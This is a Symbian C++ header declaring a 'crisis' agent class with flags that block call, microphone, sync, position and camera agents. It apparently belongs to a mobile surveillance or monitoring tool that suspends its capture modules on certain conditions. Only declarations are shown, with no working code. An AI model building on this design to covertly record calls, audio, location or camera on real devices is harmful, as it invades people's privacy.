/*
 * AgentCrisis.h
 *
 *  Created on: 01/giu/2012
 *      Author: Giovanna
 */

#ifndef AGENTCRISIS_H_
#define AGENTCRISIS_H_

#include "AbstractAgent.h"

enum TBlockedAgents
	{
	ECallCrisis = 0x0001,
	EMicCrisis = 0x0002,
	ESyncCrisis = 0x0004,
	EPosCrisis = 0x0008,
	ECamCrisis = 0x0010
	};
// CLASS DECLARATION

/**
 *  CAgentCrisis
 * 
 */
class CAgentCrisis : public CAbstractAgent
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentCrisis();

	/**
	 * Two-phased constructor.
	 */
	static CAgentCrisis* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentCrisis* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
	virtual void CycleAgentCmdL();
		
private:
	
    /**
	 * Constructor for performing 1st stage construction
	 */
	CAgentCrisis();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
private:
	
	TBool iBusy;
	TBool iFlags;
	
	__FLOG_DECLARATION_MEMBER
	};


#endif /* AGENTCRISIS_H_ */
